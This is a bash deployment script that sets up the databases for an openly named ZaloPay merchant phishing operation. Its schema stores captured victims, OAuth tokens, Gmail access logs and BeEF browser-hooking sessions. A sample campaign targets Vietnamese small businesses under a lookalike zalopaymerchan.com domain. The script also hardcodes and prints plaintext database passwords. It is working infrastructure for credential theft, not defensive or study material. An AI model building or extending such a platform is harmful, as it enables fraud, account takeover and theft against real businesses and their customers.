#!/bin/bash
# ZaloPay Merchant Phishing Platform - Database Installation Script
# Comprehensive database setup with MongoDB, Redis, and InfluxDB

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] $1${NC}"
}

error() {
    echo -e "${RED}[ERROR] $1${NC}"
    exit 1
}

warning() {
    echo -e "${YELLOW}[WARNING] $1${NC}"
}

info() {
    echo -e "${BLUE}[INFO] $1${NC}"
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   error "This script should not be run as root for security reasons"
fi

# Check system requirements
check_system_requirements() {
    log "Checking system requirements..."
    
    # Check OS
    if [[ ! -f /etc/os-release ]]; then
        error "Cannot determine OS version"
    fi
    
    . /etc/os-release
    if [[ "$ID" != "ubuntu" ]] && [[ "$ID" != "debian" ]]; then
        error "This script is designed for Ubuntu/Debian systems"
    fi
    
    # Check available memory
    MEMORY_GB=$(free -g | awk '/^Mem:/{print $2}')
    if [[ $MEMORY_GB -lt 8 ]]; then
        warning "System has less than 8GB RAM. Performance may be affected."
    fi
    
    # Check available disk space
    DISK_SPACE=$(df / | awk 'NR==2{print $4}')
    if [[ $DISK_SPACE -lt 10485760 ]]; then  # 10GB in KB
        error "Insufficient disk space. At least 10GB required."
    fi
    
    log "System requirements check passed"
}

# Install MongoDB 6.0
install_mongodb() {
    log "Installing MongoDB 6.0..."
    
    # Remove existing MongoDB
    sudo systemctl stop mongod 2>/dev/null || true
    sudo apt-get remove -y mongodb-org mongodb-org-* mongodb 2>/dev/null || true
    
    # Import MongoDB public key
    wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -
    
    # Add MongoDB repository
    echo "deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list
    
    # Update package list
    sudo apt-get update
    
    # Install MongoDB
    sudo apt-get install -y mongodb-org
    
    # Create MongoDB data directory
    sudo mkdir -p /var/lib/mongodb
    sudo mkdir -p /var/log/mongodb
    sudo chown -R mongodb:mongodb /var/lib/mongodb
    sudo chown -R mongodb:mongodb /var/log/mongodb
    
    # Create MongoDB configuration
    sudo tee /etc/mongod.conf > /dev/null <<EOF
# MongoDB Configuration for ZaloPay Phishing Platform
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true
  wiredTiger:
    engineConfig:
      journalCompressor: snappy
      directoryForIndexes: true
    collectionConfig:
      blockCompressor: snappy
    indexConfig:
      prefixCompression: true

systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
  logRotate: reopen

net:
  port: 27017
  bindIp: 0.0.0.0
  maxIncomingConnections: 1000

security:
  authorization: enabled

replication:
  replSetName: "zalopay-rs"

operationProfiling:
  slowOpThresholdMs: 100
  mode: slowOp

setParameter:
  enableLocalhostAuthBypass: false
EOF

    # Create SSL certificates
    log "Creating SSL certificates for MongoDB..."
    sudo mkdir -p /etc/ssl/mongodb
    sudo openssl req -newkey rsa:2048 -new -x509 -days 365 -nodes \
        -out /etc/ssl/mongodb/mongodb.crt \
        -keyout /etc/ssl/mongodb/mongodb.key \
        -subj "/C=VN/ST=HCM/L=HoChiMinh/O=ZaloPay/OU=IT/CN=zalopaymerchan.com"
    
    sudo cat /etc/ssl/mongodb/mongodb.key /etc/ssl/mongodb/mongodb.crt > /etc/ssl/mongodb/mongodb.pem
    sudo chmod 600 /etc/ssl/mongodb/mongodb.pem
    sudo chown mongodb:mongodb /etc/ssl/mongodb/mongodb.pem
    
    # Create keyfile for replica set
    sudo openssl rand -base64 756 > /etc/mongodb-keyfile
    sudo chmod 600 /etc/mongodb-keyfile
    sudo chown mongodb:mongodb /etc/mongodb-keyfile
    
    # Start MongoDB
    sudo systemctl start mongod
    sudo systemctl enable mongod
    
    # Wait for MongoDB to start
    sleep 10
    
    # Initialize replica set
    log "Initializing MongoDB replica set..."
    mongosh --eval "rs.initiate({_id: 'zalopay-rs', members: [{_id: 0, host: 'localhost:27017'}]})" || true
    
    # Create admin user
    log "Creating MongoDB admin user..."
    mongosh --eval "
        use admin;
        db.createUser({
            user: 'admin',
            pwd: 'ZaloPayAdmin2025!',
            roles: [
                { role: 'userAdminAnyDatabase', db: 'admin' },
                { role: 'readWriteAnyDatabase', db: 'admin' },
                { role: 'dbAdminAnyDatabase', db: 'admin' },
                { role: 'clusterAdmin', db: 'admin' }
            ]
        });
    "
    
    # Create application user
    mongosh --eval "
        use zalopay_phishing;
        db.createUser({
            user: 'zalopay_user',
            pwd: 'ZaloPayUser2025!',
            roles: [
                { role: 'readWrite', db: 'zalopay_phishing' }
            ]
        });
    "
    
    log "MongoDB installation completed successfully"
}

# Install Redis 7.0
install_redis() {
    log "Installing Redis 7.0..."
    
    # Remove existing Redis
    sudo systemctl stop redis-server 2>/dev/null || true
    sudo apt-get remove -y redis-server redis-tools 2>/dev/null || true
    
    # Add Redis repository
    curl -fsSL https://packages.redis.io/gpg | sudo gpg --dearmor -o /usr/share/keyrings/redis-archive-keyring.gpg
    echo "deb [signed-by=/usr/share/keyrings/redis-archive-keyring.gpg] https://packages.redis.io/deb $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/redis.list
    
    # Update package list
    sudo apt-get update
    
    # Install Redis
    sudo apt-get install -y redis
    
    # Create Redis configuration
    sudo tee /etc/redis/redis.conf > /dev/null <<EOF
# Redis Configuration for ZaloPay Phishing Platform
# Network
bind 0.0.0.0
port 6379
protected-mode yes
requirepass ZaloPayRedis2025!

# Memory
maxmemory 4gb
maxmemory-policy allkeys-lru

# Persistence
save 900 1
save 300 10
save 60 10000
appendonly yes
appendfsync everysec
appendfilename "appendonly.aof"

# Logging
loglevel notice
logfile /var/log/redis/redis-server.log

# Security
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command DEBUG ""

# Monitoring
latency-monitor-threshold 100
slowlog-log-slower-than 10000
slowlog-max-len 128

# Performance
tcp-keepalive 300
timeout 0
tcp-backlog 511
EOF

    # Create SSL certificates for Redis
    log "Creating SSL certificates for Redis..."
    sudo mkdir -p /etc/ssl/redis
    sudo openssl req -newkey rsa:2048 -new -x509 -days 365 -nodes \
        -out /etc/ssl/redis/redis.crt \
        -keyout /etc/ssl/redis/redis.key \
        -subj "/C=VN/ST=HCM/L=HoChiMinh/O=ZaloPay/OU=IT/CN=redis.zalopaymerchan.com"
    
    sudo chmod 600 /etc/ssl/redis/redis.key
    sudo chown redis:redis /etc/ssl/redis/redis.key
    
    # Start Redis
    sudo systemctl start redis-server
    sudo systemctl enable redis-server
    
    # Test Redis connection
    redis-cli -a "ZaloPayRedis2025!" ping
    
    log "Redis installation completed successfully"
}

# Install InfluxDB 2.0
install_influxdb() {
    log "Installing InfluxDB 2.0..."
    
    # Remove existing InfluxDB
    sudo systemctl stop influxdb 2>/dev/null || true
    sudo apt-get remove -y influxdb influxdb2 2>/dev/null || true
    
    # Add InfluxDB repository
    wget -qO- https://repos.influxdata.com/influxdb.key | sudo apt-key add -
    echo "deb https://repos.influxdata.com/ubuntu focal stable" | sudo tee /etc/apt/sources.list.d/influxdb.list
    
    # Update package list
    sudo apt-get update
    
    # Install InfluxDB
    sudo apt-get install -y influxdb2
    
    # Create InfluxDB configuration
    sudo mkdir -p /etc/influxdb2
    sudo tee /etc/influxdb2/config.yml > /dev/null <<EOF
# InfluxDB Configuration for ZaloPay Phishing Platform
bolt-path: "/var/lib/influxdb2/influxd.bolt"
engine-path: "/var/lib/influxdb2/engine"
http-bind-address: ":8086"
log-level: "info"
store: "bolt"
EOF

    # Create InfluxDB data directory
    sudo mkdir -p /var/lib/influxdb2
    sudo chown -R influxdb:influxdb /var/lib/influxdb2
    
    # Start InfluxDB
    sudo systemctl start influxdb
    sudo systemctl enable influxdb
    
    # Wait for InfluxDB to start
    sleep 15
    
    # Setup InfluxDB
    log "Setting up InfluxDB..."
    influx setup \
        --username admin \
        --password ZaloPayInflux2025! \
        --org zalopay \
        --bucket zalopay_metrics \
        --force
    
    # Create API token
    INFLUX_TOKEN=$(influx auth create \
        --org zalopay \
        --all-access \
        --json | jq -r '.token')
    
    echo "INFLUX_TOKEN=$INFLUX_TOKEN" | sudo tee -a /etc/environment
    
    log "InfluxDB installation completed successfully"
}

# Install Python dependencies
install_python_dependencies() {
    log "Installing Python dependencies..."
    
    # Install Python 3.11 if not present
    if ! command -v python3.11 &> /dev/null; then
        sudo apt-get install -y software-properties-common
        sudo add-apt-repository ppa:deadsnakes/ppa -y
        sudo apt-get update
        sudo apt-get install -y python3.11 python3.11-venv python3.11-pip
    fi
    
    # Create virtual environment
    python3.11 -m venv /opt/zalopay/venv
    source /opt/zalopay/venv/bin/activate
    
    # Install requirements
    pip install --upgrade pip
    pip install -r /home/lucian/zalopay_phishing_platform/backend/requirements.txt
    
    # Install additional monitoring tools
    pip install psutil prometheus-client
    
    log "Python dependencies installed successfully"
}

# Create database initialization script
create_db_init_script() {
    log "Creating database initialization script..."
    
    sudo mkdir -p /opt/zalopay/scripts
    
    sudo tee /opt/zalopay/scripts/init_database.py > /dev/null <<'EOF'
#!/usr/bin/env python3
"""
Database Initialization Script for ZaloPay Phishing Platform
"""

import asyncio
import sys
import os
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
import redis
from influxdb_client import InfluxDBClient

# Add project root to path
sys.path.append('/home/lucian/zalopay_phishing_platform')

from backend.config import settings

class DatabaseInitializer:
    def __init__(self):
        self.mongo_client = AsyncIOMotorClient(
            f"mongodb://admin:ZaloPayAdmin2025!@localhost:27017/admin?authSource=admin"
        )
        self.db = self.mongo_client.zalopay_phishing
        self.redis_client = redis.Redis(
            host='localhost', 
            port=6379, 
            password='ZaloPayRedis2025!',
            decode_responses=True
        )
        self.influx_client = InfluxDBClient(
            url="http://localhost:8086",
            token=os.getenv('INFLUX_TOKEN', ''),
            org="zalopay"
        )
    
    async def initialize_database(self):
        """Initialize database with all collections and indexes"""
        
        print("🚀 Starting database initialization...")
        
        # Create collections
        await self.create_collections()
        
        # Create indexes
        await self.create_indexes()
        
        # Insert initial data
        await self.insert_initial_data()
        
        # Verify setup
        await self.verify_setup()
        
        print("✅ Database initialization completed successfully!")
    
    async def create_collections(self):
        """Create all required collections"""
        
        collections = [
            'victims', 'oauth_tokens', 'admin_users', 'campaigns',
            'activity_logs', 'gmail_access_logs', 'beef_sessions',
            'proxies', 'system_metrics', 'intelligence_reports'
        ]
        
        for collection_name in collections:
            try:
                await self.db.create_collection(collection_name)
                print(f"✅ Created collection: {collection_name}")
            except Exception as e:
                print(f"⚠️  Collection {collection_name} may already exist: {e}")
    
    async def create_indexes(self):
        """Create all required indexes"""
        
        print("📊 Creating database indexes...")
        
        # Victims collection indexes
        await self.db.victims.create_index("email", unique=True)
        await self.db.victims.create_index([("capture_timestamp", -1)])
        await self.db.victims.create_index([("validation.market_value", 1), ("validation.status", 1)])
        await self.db.victims.create_index([("campaign_id", 1), ("capture_timestamp", -1)])
        await self.db.victims.create_index("session_data.ip_address")
        await self.db.victims.create_index("device_fingerprint.fingerprint_id")
        
        # OAuth tokens indexes
        await self.db.oauth_tokens.create_index("victim_id")
        await self.db.oauth_tokens.create_index([("provider", 1), ("token_metadata.token_status", 1)])
        await self.db.oauth_tokens.create_index([("expires_at", 1)], expireAfterSeconds=0)
        
        # Admin users indexes
        await self.db.admin_users.create_index("username", unique=True)
        await self.db.admin_users.create_index("email", unique=True)
        await self.db.admin_users.create_index([("role", 1), ("is_active", 1)])
        
        # Activity logs indexes
        await self.db.activity_logs.create_index([("actor.admin_id", 1), ("timestamp", -1)])
        await self.db.activity_logs.create_index([("action_type", 1), ("timestamp", -1)])
        await self.db.activity_logs.create_index([("retention_expires", 1)], expireAfterSeconds=0)
        
        # Campaigns indexes
        await self.db.campaigns.create_index("code", unique=True)
        await self.db.campaigns.create_index([("status", 1), ("timeline.actual_start", -1)])
        
        print("✅ All indexes created successfully")
    
    async def insert_initial_data(self):
        """Insert initial data"""
        
        print("📝 Inserting initial data...")
        
        # Create default admin user
        admin_user = {
            "username": "admin",
            "email": "admin@zalopaymerchan.com",
            "password_hash": "$2b$12$LQv3c1yqBwmnJ21x7L2YsO.W3E5Q5F5F5F5F5F5F5F5F5F5F5F5F5",
            "role": "super_admin",
            "permissions": [
                "dashboard_view", "victim_management", "gmail_exploitation",
                "beef_control", "campaign_management", "data_export",
                "system_monitoring", "admin_management"
            ],
            "mfa_config": {
                "mfa_enabled": True,
                "mfa_method": "totp"
            },
            "is_active": True,
            "created_at": datetime.utcnow()
        }
        
        try:
            await self.db.admin_users.insert_one(admin_user)
            print("✅ Default admin user created")
        except Exception as e:
            print(f"⚠️  Admin user may already exist: {e}")
        
        # Create sample campaign
        sample_campaign = {
            "name": "ZaloPay Merchant Q4 2025 - Vietnamese SME",
            "code": "ZPM_Q4_2025_VN_SME",
            "description": "Targeting Vietnamese small-medium enterprises",
            "status": "active",
            "timeline": {
                "planned_start": datetime.utcnow(),
                "actual_start": datetime.utcnow(),
                "current_phase": "active_exploitation"
            },
            "statistics": {
                "total_visits": 0,
                "unique_visitors": 0,
                "credential_captures": 0,
                "successful_validations": 0
            },
            "created_at": datetime.utcnow()
        }
        
        try:
            await self.db.campaigns.insert_one(sample_campaign)
            print("✅ Sample campaign created")
        except Exception as e:
            print(f"⚠️  Sample campaign may already exist: {e}")
    
    async def verify_setup(self):
        """Verify database setup"""
        
        print("🔍 Verifying database setup...")
        
        # Check collections
        collections = await self.db.list_collection_names()
        expected_collections = [
            'victims', 'oauth_tokens', 'admin_users', 'campaigns',
            'activity_logs', 'gmail_access_logs', 'beef_sessions'
        ]
        
        for collection in expected_collections:
            if collection not in collections:
                raise Exception(f"Collection {collection} not found")
        
        # Check indexes
        victims_indexes = await self.db.victims.list_indexes().to_list()
        if len(victims_indexes) < 5:
            raise Exception("Insufficient indexes on victims collection")
        
        # Test Redis connection
        self.redis_client.ping()
        
        # Test InfluxDB connection
        health = self.influx_client.health()
        if health.status != 'pass':
            raise Exception("InfluxDB health check failed")
        
        print("✅ Database verification completed")

async def main():
    initializer = DatabaseInitializer()
    await initializer.initialize_database()

if __name__ == "__main__":
    asyncio.run(main())
EOF

    sudo chmod +x /opt/zalopay/scripts/init_database.py
    
    log "Database initialization script created"
}

# Create monitoring script
create_monitoring_script() {
    log "Creating database monitoring script..."
    
    sudo tee /opt/zalopay/scripts/monitor_database.py > /dev/null <<'EOF'
#!/usr/bin/env python3
"""
Database Health Monitoring Script for ZaloPay Phishing Platform
"""

import asyncio
import json
import sys
import os
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
import redis
from influxdb_client import InfluxDBClient

# Add project root to path
sys.path.append('/home/lucian/zalopay_phishing_platform')

from backend.config import settings

class DatabaseHealthMonitor:
    def __init__(self):
        self.mongo_client = AsyncIOMotorClient(
            f"mongodb://admin:ZaloPayAdmin2025!@localhost:27017/admin?authSource=admin"
        )
        self.db = self.mongo_client.zalopay_phishing
        self.redis_client = redis.Redis(
            host='localhost', 
            port=6379, 
            password='ZaloPayRedis2025!',
            decode_responses=True
        )
        self.influx_client = InfluxDBClient(
            url="http://localhost:8086",
            token=os.getenv('INFLUX_TOKEN', ''),
            org="zalopay"
        )
    
    async def check_health(self):
        """Comprehensive database health check"""
        
        health_report = {
            'timestamp': datetime.utcnow().isoformat(),
            'mongodb': await self.check_mongodb_health(),
            'redis': await self.check_redis_health(),
            'influxdb': await self.check_influxdb_health(),
            'overall_status': 'unknown'
        }
        
        # Determine overall status
        all_healthy = all([
            health_report['mongodb']['status'] == 'healthy',
            health_report['redis']['status'] == 'healthy',
            health_report['influxdb']['status'] == 'healthy'
        ])
        
        health_report['overall_status'] = 'healthy' if all_healthy else 'unhealthy'
        
        return health_report
    
    async def check_mongodb_health(self):
        """Check MongoDB health"""
        
        try:
            # Test connection
            await self.mongo_client.admin.command('ping')
            
            # Check replica set status
            rs_status = await self.mongo_client.admin.command('replSetGetStatus')
            
            # Check database stats
            db_stats = await self.mongo_client.zalopay_phishing.command('dbStats')
            
            # Check collection counts
            collection_counts = {}
            collections = ['victims', 'oauth_tokens', 'admin_users', 'campaigns']
            for collection in collections:
                count = await self.db[collection].count_documents({})
                collection_counts[collection] = count
            
            return {
                'status': 'healthy',
                'replica_set_status': rs_status['ok'],
                'database_size': db_stats['dataSize'],
                'collection_counts': collection_counts,
                'uptime': rs_status['uptime']
            }
            
        except Exception as e:
            return {
                'status': 'unhealthy',
                'error': str(e)
            }
    
    async def check_redis_health(self):
        """Check Redis health"""
        
        try:
            # Test connection
            self.redis_client.ping()
            
            # Get info
            info = self.redis_client.info()
            
            return {
                'status': 'healthy',
                'memory_usage': info['used_memory_human'],
                'connected_clients': info['connected_clients'],
                'uptime': info['uptime_in_seconds']
            }
            
        except Exception as e:
            return {
                'status': 'unhealthy',
                'error': str(e)
            }
    
    async def check_influxdb_health(self):
        """Check InfluxDB health"""
        
        try:
            # Test connection
            health = self.influx_client.health()
            
            return {
                'status': 'healthy' if health.status == 'pass' else 'unhealthy',
                'message': health.message,
                'version': health.version
            }
            
        except Exception as e:
            return {
                'status': 'unhealthy',
                'error': str(e)
            }

async def main():
    monitor = DatabaseHealthMonitor()
    health_report = await monitor.check_health()
    print(json.dumps(health_report, indent=2))

if __name__ == "__main__":
    asyncio.run(main())
EOF

    sudo chmod +x /opt/zalopay/scripts/monitor_database.py
    
    log "Database monitoring script created"
}

# Create backup script
create_backup_script() {
    log "Creating database backup script..."
    
    sudo tee /opt/zalopay/scripts/backup_database.sh > /dev/null <<'EOF'
#!/bin/bash
# Database Backup Script for ZaloPay Phishing Platform

BACKUP_DIR="/opt/zalopay/backups"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_PATH="$BACKUP_DIR/backup_$DATE"

# Create backup directory
mkdir -p $BACKUP_PATH

echo "🔄 Starting database backup..."

# Backup MongoDB
echo "📊 Backing up MongoDB..."
mongodump --host localhost:27017 \
    --username admin \
    --password ZaloPayAdmin2025! \
    --authenticationDatabase admin \
    --out $BACKUP_PATH/mongodb

# Backup Redis
echo "🔴 Backing up Redis..."
redis-cli -a "ZaloPayRedis2025!" --rdb $BACKUP_PATH/redis.rdb

# Backup InfluxDB
echo "📈 Backing up InfluxDB..."
influx backup $BACKUP_PATH/influxdb

# Create compressed archive
echo "📦 Creating compressed archive..."
cd $BACKUP_DIR
tar -czf "backup_$DATE.tar.gz" "backup_$DATE"
rm -rf "backup_$DATE"

echo "✅ Backup completed: backup_$DATE.tar.gz"
EOF

    sudo chmod +x /opt/zalopay/scripts/backup_database.sh
    
    # Create backup directory
    sudo mkdir -p /opt/zalopay/backups
    sudo chown -R $USER:$USER /opt/zalopay/backups
    
    log "Database backup script created"
}

# Main installation function
main() {
    log "🚀 Starting ZaloPay Phishing Platform Database Installation"
    
    # Check system requirements
    check_system_requirements
    
    # Update system packages
    log "Updating system packages..."
    sudo apt-get update
    sudo apt-get upgrade -y
    
    # Install required packages
    log "Installing required packages..."
    sudo apt-get install -y \
        wget \
        curl \
        gnupg \
        lsb-release \
        software-properties-common \
        jq \
        python3-pip \
        python3-venv
    
    # Install databases
    install_mongodb
    install_redis
    install_influxdb
    
    # Install Python dependencies
    install_python_dependencies
    
    # Create scripts
    create_db_init_script
    create_monitoring_script
    create_backup_script
    
    # Initialize database
    log "Initializing database..."
    source /opt/zalopay/venv/bin/activate
    python3 /opt/zalopay/scripts/init_database.py
    
    # Run health check
    log "Running health check..."
    python3 /opt/zalopay/scripts/monitor_database.py
    
    log "🎉 Database installation completed successfully!"
    log "📋 Next steps:"
    log "   1. Configure your application to use the databases"
    log "   2. Set up monitoring and alerting"
    log "   3. Schedule regular backups"
    log "   4. Test the system thoroughly"
    
    info "Database credentials:"
    info "  MongoDB: admin / ZaloPayAdmin2025!"
    info "  Redis: ZaloPayRedis2025!"
    info "  InfluxDB: admin / ZaloPayInflux2025!"
}

# Run main function
main "$@"